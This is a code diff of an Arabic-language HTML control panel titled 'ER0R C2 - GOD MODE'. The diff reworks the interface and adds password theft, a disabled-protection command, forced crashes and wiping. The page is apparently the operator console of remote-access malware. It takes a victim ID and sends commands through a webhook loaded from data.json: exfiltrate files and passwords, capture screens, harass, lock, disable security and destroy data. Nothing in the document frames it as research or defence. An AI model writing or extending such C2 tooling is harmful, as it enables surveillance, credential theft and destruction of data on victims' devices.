@@ -2,58 +2,57 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>ER0R C2 - MASTER CONTROL</title>
+    <title>ER0R C2 - GOD MODE</title>
     <style>
-        body { background: #050505; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
-        .main { max-width: 900px; margin: auto; border: 2px solid #6001d2; border-radius: 15px; padding: 25px; background: #0a0a0a; box-shadow: 0 0 30px rgba(96, 1, 210, 0.5); }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .card { background: #111; border: 1px solid #222; padding: 15px; border-radius: 10px; }
-        h3 { color: #6001d2; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .btn { background: #1a1a1a; border: 1px solid #6001d2; color: #fff; padding: 12px; cursor: pointer; width: 100%; margin: 5px 0; border-radius: 5px; transition: 0.3s; }
-        .btn:hover { background: #6001d2; box-shadow: 0 0 15px #6001d2; }
-        .lock-btn { border-color: #ff0055; color: #ff0055; }
-        .lock-btn:hover { background: #ff0055; color: #fff; }
-        #console { background: #000; color: #0f0; padding: 15px; height: 120px; overflow-y: auto; margin-top: 20px; border-radius: 5px; font-family: monospace; font-size: 13px; }
+        body { background: #000; color: #fff; font-family: sans-serif; padding: 20px; }
+        .panel { max-width: 1000px; margin: auto; border: 2px solid #6001d2; padding: 30px; border-radius: 20px; background: #050505; box-shadow: 0 0 50px #6001d2; }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
+        .card { background: #111; border: 1px solid #222; padding: 15px; border-radius: 10px; text-align: center; }
+        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 12px; cursor: pointer; width: 100%; margin: 5px 0; border-radius: 8px; font-weight: bold; }
+        .btn:hover { background: #6001d2; }
+        .danger { border-color: #ff0000; color: #ff0000; }
+        .danger:hover { background: #ff0000; color: #fff; }
+        #log { background: #000; color: #0f0; padding: 10px; height: 100px; overflow-y: auto; margin-top: 20px; border: 1px solid #222; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="main">
-        <h1 style="text-align:center; color:#6001d2; text-shadow: 0 0 10px #6001d2;">📟 منظومة السيطرة المطلقة ER0R V3</h1>
-        
-        <div style="text-align:center; margin-bottom:20px;">
-            <input type="text" id="vID" placeholder="أدخل ID الضحية" style="padding:12px; width:300px; background:#000; border:1px solid #6001d2; color:#fff; text-align:center;">
-        </div>
+    <div class="panel">
+        <h1 style="color:#6001d2; text-shadow: 0 0 10px #6001d2;">📟 مركز السيطرة الكونية ER0R V3</h1>
+        <input type="text" id="targetID" placeholder="ID الهدف" style="width:100%; padding:15px; background:#000; border:1px solid #6001d2; color:#fff; margin-bottom:20px; text-align:center;">
 
         <div class="grid">
             <div class="card">
-                <h3>📂 استخراج البيانات</h3>
-                <button class="btn" onclick="exe('سحب الصور')">🖼️ سحب جميع الصور</button>
-                <button class="btn" onclick="exe('سحب الفيديو')">🎥 سحب الفيديوهات</button>
-                <button class="btn" onclick="exe('تصوير الشاشة')">📸 تصوير الشاشة</button>
+                <h3 style="color:#6001d2;">📁 البيانات</h3>
+                <button class="btn" onclick="sendCmd('سحب الكل')">📥 سحب شامل</button>
+                <button class="btn" onclick="sendCmd('تصوير الشاشة')">📸 لقطة شاشة</button>
+                <button class="btn" onclick="sendCmd('سحب الباسوردات')">🔑 كلمات المرور</button>
             </div>
             <div class="card">
-                <h3>🔒 التحكم والقيود</h3>
-                <button class="btn lock-btn" onclick="exe('إظهار واجهة التحكم')">🚫 قفل الجهاز (GUI + Input)</button>
-                <button class="btn" onclick="exe('إلغاء القفل')">🔓 فك قفل الجهاز</button>
-                <button class="btn lock-btn" onclick="exe('فرمتة')">💀 تدمير وفرمتة</button>
+                <h3 style="color:#6001d2;">🕹️ الإزعاج</h3>
+                <button class="btn" onclick="sendCmd('تزمير')">📢 إطلاق تزمير عالي</button>
+                <button class="btn" onclick="sendCmd('فتح موقع')">🌐 فتح موقع إجباري</button>
+                <button class="btn" onclick="sendCmd('إظهار واجهة التحكم')">🚫 قفل الجهاز</button>
+            </div>
+            <div class="card">
+                <h3 style="color:red;">☢️ تدمير</h3>
+                <button class="btn danger" onclick="sendCmd('تعطيل الحماية')">🛡️ إطفاء الحماية</button>
+                <button class="btn danger" onclick="sendCmd('شاشة الموت')">💀 شاشة الموت</button>
+                <button class="btn danger" onclick="sendCmd('فرمتة')">🔥 مسح وتدمير</button>
             </div>
         </div>
-
-        <div id="console">> System ready. Standing by...</div>
+        <div id="log">> Waiting for target...</div>
     </div>
 
     <script>
-        async function exe(cmd) {
-            const id = document.getElementById('vID').value;
-            if(!id) return alert("يرجى إدخال ID الهدف أولاً!");
-            
-            document.getElementById('console').innerHTML += `<br>> Executing [${cmd}] on ${id}...`;
-            
-            const configData = await fetch('./data.json').then(r => r.json());
-            await fetch(configData.webhook_url, {
+        async function sendCmd(c) {
+            const id = document.getElementById('targetID').value;
+            if(!id) return alert("أدخل ID الضحية!");
+            document.getElementById('log').innerHTML += `<br>> Executing [${c}]...`;
+            const cfg = await fetch('./data.json').then(r => r.json());
+            await fetch(cfg.webhook_url, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `⚠️ **أمر سيطرة:**\nالهدف: \`${id}\`\nالأمر: **${cmd}**` })
+                body: JSON.stringify({ content: `⚠️ **أمر تحكم:**\nالهدف: \`${id}\`\nالأمر: **${c}**` })
             });
         }
     </script>
